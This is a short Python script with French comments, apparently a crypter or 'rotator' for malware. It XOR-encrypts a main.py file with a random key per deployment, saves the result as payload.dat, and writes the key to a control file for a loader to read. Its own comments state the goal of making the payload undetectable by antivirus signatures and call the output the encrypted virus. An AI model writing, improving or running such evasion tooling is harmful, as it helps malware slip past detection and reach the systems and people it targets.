import random, string, os

def xor_cipher(data, key):
    """Chiffrement XOR pour rendre le payload indétectable par signature [cite: 2025-08-28]"""
    return bytearray(data[i] ^ ord(key[i % len(key)]) for i in range(len(data)))

def generate_key(length=32):
    """Génère une clé unique et complexe pour chaque déploiement [cite: 2025-08-28]"""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(characters, k=length))

def run_rotator():
    # 1. Vérification du fichier source
    if not os.path.exists("main.py"):
        print("--- ❌ ERREUR : main.py introuvable ---")
        return

    # 2. Lecture du code source
    with open("main.py", "rb") as f:
        original_data = f.read()

    # 3. Chiffrement
    secret_key = generate_key()
    encrypted_payload = xor_cipher(original_data, secret_key)

    # 4. Sauvegarde du Payload (Le virus chiffré)
    with open("payload.dat", "wb") as f:
        f.write(encrypted_payload)

    # 5. Création du fichier de contrôle (Clé + Nom du fichier)
    # C'est ce fichier que le loader ira lire en premier
    with open("control.txt", "w") as f:
        f.write(f"{secret_key}|payload.dat")

    print("--- ✅ TERMINE_AVEC_SUCCES ---")
    print(f"Clé générée : {secret_key}")

if __name__ == "__main__":
    run_rotator()
